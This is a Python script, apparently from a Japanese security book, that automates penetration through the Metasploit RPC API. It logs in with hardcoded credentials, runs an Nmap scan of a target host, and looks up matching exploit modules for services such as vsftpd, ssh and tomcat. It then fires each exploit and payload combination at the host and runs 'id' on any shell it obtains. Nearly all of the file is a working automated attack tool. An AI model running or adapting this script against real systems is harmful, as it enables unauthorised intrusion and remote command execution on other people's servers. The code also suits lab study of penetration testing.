####################################################################### Metasploit RPC Serverへの接続
import http.client

host = "192.168.220.144"  # RPC ServerのIPアドレス
port = 55553              # RPC Serverの待ち受けポート番号
ssl = False               # SSLを有効化した場合は「True」

if ssl:
    # HTTPSで接続
    client = http.client.HTTPSConnection(host, port)
else:
    # HTTPで接続
    client = http.client.HTTPConnection(host, port)

####################################################################### Metasploit RPC Serverの認証
import msgpack


# RPC Serverとのインタフェースメソッド
def call(meth, option):
    global authenticated
    global token
    if meth != "auth.login":
        if not authenticated:
            print('MsfRPC: Not Authenticated')
            exit(1)

    # 認証以外のAPIの場合は、オプションに認証済みトークンを入れる
    if meth != "auth.login":
        option.insert(0, token)

    # オプションの組み立て
    option.insert(0, meth)

    # パラメータをmsgpackでシリアライズ
    params = msgpack.packb(option)

    # RPC APIの実行
    client.request("POST", "/api/", params, {"Content-type": "binary/message-pack"})

    # RPC APIの実行結果を返却
    # 実行結果はmsgpackからデシリアライズ
    resp = client.getresponse()
    return msgpack.unpackb(resp.read())

# Log in to RPC Server.
user = "test"            # 認証用のユーザ
password = "NsSJMEI3"    # 認証用のパスワード
authenticated = False    # 認証有無を示すFlag
token = False            # クライアントを識別するトークン

# 認証の実行
# 第一引数にRPC API名を指定
# ここでは認証するため「auth.login」を指定
ret = call('auth.login', [user, password])

# 認証に成功したらトークンを取得し、認証済みフラグをTrueとする
if ret.get(b'result') == b'success':
    authenticated = True
    token = ret.get(b'token')
else:
    print('MsfRPC: Authentication failed')
    exit(1)

####################################################################### MSFconsoleの作成
# MSFconsoleの作成
ret = call('console.create', [])
console_id = ret.get(b'id')

####################################################################### Nmapの実行
import time

# Nmapオプション
nmap_option = "-Pn -sS -A -r --max-retries 3"
# ターゲットサーバのIPアドレス
rhost = "192.168.220.145"

# Nmapコマンドの組み立て
nmap_cmd = 'db_nmap ' + nmap_option + ' ' + rhost + '\n'

# Nmapの実行
# MSFconsoleにNmapコマンドを書き込む
_ = call('console.write', [console_id, nmap_cmd])
time.sleep(3.0)
time_count = 0

while True:
    # 定期的にMSFconsoleのバッファを読み込む
    ret = call('console.read', [console_id])
    status = ret.get(b'busy')  # MSFconsoleのbusy状態を取得

    # MSFconsoleのbusyが解除（コマンドが正常終了）された時の処理
    if status is False:
        print('[*] Nmap finish   : {0}'.format(nmap_cmd))
        break

    # タイムアウト時の処理
    if time_count == 600:
        print('[*] Timeout   : {0}'.format(nmap_cmd))
        exit(1)
    time.sleep(1.0)
    time_count += 1

####################################################################### Nmapの実行結果の取得
import re


# パース処理
def cutting_strings(pattern, target):
    return re.findall(pattern, target)

# servicesコマンドの組み立て
services_cmd = 'services -c port,proto,info -R ' + rhost + '\n'

# servicesの実行
_ = call('console.write', [console_id, services_cmd])
time.sleep(3.0)
time_count = 0

cmd_result = ''
while True:
    # 定期的にMSFconsoleのバッファを読み込む
    ret = call('console.read', [console_id])
    cmd_result += ret.get(b'data').decode('utf-8')
    status = ret.get(b'busy')  # MSFconsoleのbusy状態を取得

    # MSFconsoleのbusyが解除（コマンドが正常終了）された時の処理
    if status is False:
        print('[*] services finish   : {0}'.format(services_cmd))
        break

    # タイムアウト時の処理
    if time_count == 10:
        print('[*] Timeout: "{0}"'.format(services_cmd))
        exit(1)
    time.sleep(1.0)
    time_count += 1

# servicesコマンドの実行結果から各ポート/詳細情報を取得
tmp_port_list = []
tmp_info_list = []
tmp_port_list = cutting_strings(rhost + r'  ([0-9]{1,5})', cmd_result)
tmp_info_list = cutting_strings(rhost + r'  [0-9]{1,5} .*[tcp|udp]    (.*)', cmd_result)

# ポートが一つも空いていない場合の処理
if len(tmp_port_list) == 0:
    print('[*] No open port.')
    exit(1)

####################################################################### サービス名称の取得
# Exploit対象のサービス名称を@区切りで定義
# このサービス名称は「Metasploitのsearchコマンドで検索可能な名称」にすること
target_service = "vsftpd@ssh@telnet@postfix@bind@vnc@irc@tomcat"
tmp_srv_list = target_service.split('@')

port_list = []
service_list = []
for (idx, info) in enumerate(tmp_info_list):
    for service in tmp_srv_list:
        # 詳細情報に事前定義したサービス名称が含まれていた場合、
        # 該当のポート番号とサービス名称をリストに追加。
        if service in tmp_info_list[idx].lower():
            port_list.append(tmp_port_list[idx])
            service_list.append(service)

####################################################################### Exploit moduleの取得
# Port scanningで取得したサービスに関連するExploit moduleを取得
for idx, prod_name in enumerate(service_list):
    # Exploit moduleの格納リスト
    module_list = []

    # searchコマンドでターゲットサービスのExploit moduleを検索
    search_cmd = 'search name:' + prod_name + ' type:exploit app:server\n'
    _ = call('console.write', [console_id, search_cmd])
    time.sleep(3.0)
    ret = call('console.read', [console_id])
    raw = ret.get(b'data').decode('utf-8')

    # searchコマンドの実行結果をパースしてExploit module名称を抽出
    exploit_candidate_list = cutting_strings(r'(exploit/.*)', raw)

    # Rankがexcellent, great, goodのExploit moduleのみ取得
    for exploit in exploit_candidate_list:
        raw_exploit_info = exploit.split(' ')
        exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
        if exploit_info[2] in {'excellent', 'great', 'good'}:
            module_list.append(exploit_info[0])

####################################################################### Targetの取得
    for exploit_module in module_list:
        # Exploit moduleのセット.
        set_cmd = 'use ' + exploit_module + '\n'
        _ = call('console.write', [console_id, set_cmd])
        time.sleep(1.0)
        _ = call('console.read', [console_id])

        # 該当モジュールのTargetリストの取得
        show_cmd = 'show targets\n'
        _ = call('console.write', [console_id, show_cmd])
        time.sleep(3.0)
        ret = call('console.read', [console_id])
        target_info = ret.get(b'data').decode('utf-8')
        target_list = cutting_strings(r'\s+([0-9]{1,3}).*[a-z|A-Z|0-9].*[\r\n]', target_info)

####################################################################### Payloadの取得
        payload_list = []
        for target in target_list:
            result = ''
            # Targetに紐付くPayloadを取得
            ret = call('module.target_compatible_payloads', [exploit_module, target])
            byte_list = ret[b'payloads']
            for module in byte_list:
                payload_list.append(module.decode('utf-8'))

####################################################################### Exploit moduleオプションの設定
            for payload in payload_list:
                # Exploit moduleのオプションを取得
                options = call('module.options', ["exploit", exploit_module])
                key_list = options.keys()
                option = {}
                for key in key_list:
                    # Requiredのオプション値を設定
                    if options[key][b'required'] is True:
                        sub_key_list = options[key].keys()
                        # オプションのDefault値が存在する場合は一先ずデフォルト値を設定
                        if b'default' in sub_key_list:
                            option[key.decode('utf-8')] = options[key][b'default']
                        else:
                            option[key.decode('utf-8')] = '0'
                # 任意のオプションを設定（ここではRHOST,RPORT,PAYLOADのみ変更）
                option['RHOST'] = rhost
                option['RPORT'] = int(port_list[idx])
                if payload != '':
                    option['PAYLOAD'] = payload

####################################################################### Exploitの実行
                # Exploitの実行
                ret = call('module.execute', ["exploit", exploit_module, option])
                job_id = ret[b'job_id']
                uuid = ret[b'uuid'].decode('utf-8')

####################################################################### Exploit moduleの終了確認
                # Exploit moduleの実行完了を確認
                if uuid is not None:
                    # Exploit moduleの実行完了を一定秒数待つ
                    time_count = 0
                    while True:
                        # Jobリストの取得
                        jobs = call('job.list', [])
                        byte_list = jobs.keys()
                        job_id_list = []
                        for job_id in byte_list:
                            job_id_list.append(int(job_id.decode('utf-8')))
                        # Jobリストに当該モジュールのJobが含まれる場合
                        # （Jobが実行中の場合）は1秒間waitする
                        if job_id in job_id_list:
                            time.sleep(1)
                        # Jobが終了している場合はループを抜ける
                        else:
                            break
                        # タイムアウトの場合はJobを削除
                        if time_count == 100:
                            # Jobの削除
                            call('job.stop', [job_id])
                            break
                        time_count += 1

####################################################################### Exploit成否の確認
                    # セッションリストの取得
                    time.sleep(5.0)
                    sessions = call('session.list', [])
                    key_list = sessions.keys()
                    if len(key_list) != 0:
                        for key in key_list:
                            # セッションリストから全UUIDを抽出
                            exploit_uuid = sessions[key][b'exploit_uuid'].decode('utf-8')

                            # UUIDとexploit_uuidが一致している場合にExploit成功と見なす
                            if uuid == exploit_uuid:
                                print("bingo!!")

####################################################################### Post Exploitの実行
                                session_id = int(key)
                                session_type = sessions[key][b'type'].decode('utf-8')

                                # Shellセッションを使用し、ターゲットサーバ上で任意のOSコマンドを実行
                                if session_type == 'shell':
                                    _ = call('session.shell_write', [str(session_id), 'id\n'])
                                    ret = call('session.shell_read', [str(session_id), 0])
                                    print(ret[b'data'].decode('utf-8'))

                                    # セッションの破棄
                                    _ = call('session.stop', [str(session_id)])
                                else:
                                    # meterpreterやpowershellなどのセッションを利用した処理を記述
                                    # 本書では割愛しますm(_ _)m
                                    print('Not implemented.')

####################################################################### MSFconsoleの破棄
# MSFconsoleのクローズ
_ = call('console.session_kill', [console_id])

####################################################################### ログアウト
# 認証の解除
ret = call('auth.logout', [])
if ret.get(b'result') == b'success':
    authenticated = False
    token = ''
    print('finish!!')
else:
    print('[*] MsfRPC: Authentication failed')
    exit(1)
